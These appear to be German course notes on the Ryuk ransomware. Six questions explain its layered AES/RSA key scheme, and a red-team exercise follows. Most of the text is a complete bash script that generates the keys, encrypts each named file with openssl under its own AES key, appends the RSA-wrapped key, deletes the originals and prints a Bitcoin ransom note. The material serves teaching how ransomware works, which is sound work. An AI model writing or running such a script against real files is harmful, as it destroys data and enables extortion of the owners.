## Übung Fragen
**1. Warum AES-256-CBC für das Verschlüsseln der einzelnen Dateien?**  
Der Angreifer muss potenziell riesige Datenmengen  
in kurzer Zeit verschlüsseln, bevor der Angriff auffällt.   
AES ist symmetrisch und dadurch extrem schnell (jede auch alte CPU).   

**2. Warum ein eigener Key für jede Datei?**  
Weil wenn ein Opfer den Key bekommt (durch zahlen usw.) kann er diesen weitergeben    
und andere Opfer würden es entschlüsseln können  

**3. Warum wird dieser AES-Key dann RSA-verschlüsselt?**  
Der AES-Key liegt ja im Klartext irgendwo vor (er muss ja verwendet werden).   
Damit ihn niemand außer dem Angreifer lesen kann, wird er mit einem öffentlichen RSA-Schlüssel verschlüsselt.  
Gut für kleine Dateien

**4. Warum an die Datei angehängt?**  
So bleibt der verschlüsselte AES-Key immer bei "seiner" Datei,   
ohne dass man ein separates Verzeichnis mit Tausenden Key-Dateien verwalten und synchron halten muss.  

**5. Warum wird der victim-RSA-private-Key dann AES-verschlüsselt?**  
Der rsa_victim_key_private muss lokal am Opfersystem bleiben (er wird für die spätere Entschlüsselung aller Dateien gebraucht).   
Läge er im Klartext vor, könnte ihn jeder mit Zugriff auf das System nutzen.  

**6. Warum wird ein globaler RSA-Key verwendet, um aes_victim_key zu verschlüsseln?**  
Das ist der zentrale Kontrollmechanismus des Angreifers: Nur wer den rsa_global_key_private besitzt, kann aes_victim_key   
und damit letztlich alle Daten des Opfers entschlüsseln. Einfacher nur einen Global key zu haben als meherere

## Übung Ryuk – Red Team
Red Team = Angreifer
Erstelle ein bash Script das mehrere Dateinamen als Argumente akzeptiert und diese Dateien nach der von Ryuk angewendeten Strategie verschlüsselt. Verwende openssl.

Z.B. alle Dateien im Verzeichnis verschlüsseln:
```sh
$ ryuk_ransom 
```
Nach dem Verschlüsseln aller Daten soll eine furchterregende "Ransom Note" ausgegeben werden.

**Keys generieren** 

```sh
openssl genrsa -out rsa_global_private.pem 2048
openssl rsa -in rsa_global_private.pem -pubout -out rsa_global_public.pem
openssl genrsa -out rsa_victim_private.pem 2048
openssl rsa -in rsa_victim_private.pem -pubout -out rsa_victim_public.pem
openssl rand -hex 32 > aes_victim_key.hex
```

**Verschlüsseln** 

```sh
#!/bin/bash
if [ $# -eq 0 ]; then
  echo "Verwendung: $0 datei1 [datei2 ...]"
  exit 1
fi
# Laden der Keys
AES_VICTIM_KEY=$(cat aes_victim_key.hex)
RSA_VICTIM_PUBLIC="rsa_victim_public.pem"
RSA_GLOBAL_PUBLIC="rsa_global_public.pem"
# 1. rsa_victim_private mit AES verschlüsseln
openssl aes-256-cbc -in rsa_victim_private.pem \
-K "$AES_VICTIM_KEY" -iv 0 \
-out victim_private.enc 2>/dev/null
# 2. aes_victim_key mit globalem RSA public verschlüsseln
echo -n "$AES_VICTIM_KEY" | openssl pkeyutl -encrypt \
  -pubin -inkey "$RSA_GLOBAL_PUBLIC" \
  -out victim_key.enc 2>/dev/null
# 3. Dateien verschlüsseln
for file in "$@"; do
if [ ! -f "$file" ]; then
    echo "[-] Überspringe (keine Datei): $file"
    continue
  fi
  AES_FILE_KEY=$(openssl rand -hex 32)
  # Datei verschlüsseln
  openssl aes-256-cbc -in "$file" \
    -K "$AES_FILE_KEY" -iv 0 \
    -out "${file}.tmp" 2>/dev/null
  # AES-Key mit Victim-Public RSA verschlüsseln
 
  echo -n "$AES_FILE_KEY" | openssl pkeyutl -encrypt \
    -pubin -inkey "$RSA_VICTIM_PUBLIC" \
    -out key.bin 2>/dev/null
  # Key anhängen und Original ersetzen
cat "${file}.tmp" key.bin > "${file}.ryk"
  rm -f "$file" "${file}.tmp" key.bin
  mv "${file}.ryk" "$file"
  echo "Verschlüsselt: $file"
done
# Ransom Note
echo
echo "============================================================"
echo "                   Your Files are cooked"
echo "============================================================"
echo
echo "To recover your data send 6.7 Bitcoin to:"
echo "guatvfzilovejonejkgfczffziugxzfwretfzgwnux"
echo
echo "After payment contact us and send your victim_key.enc"
echo "============================================================"
```
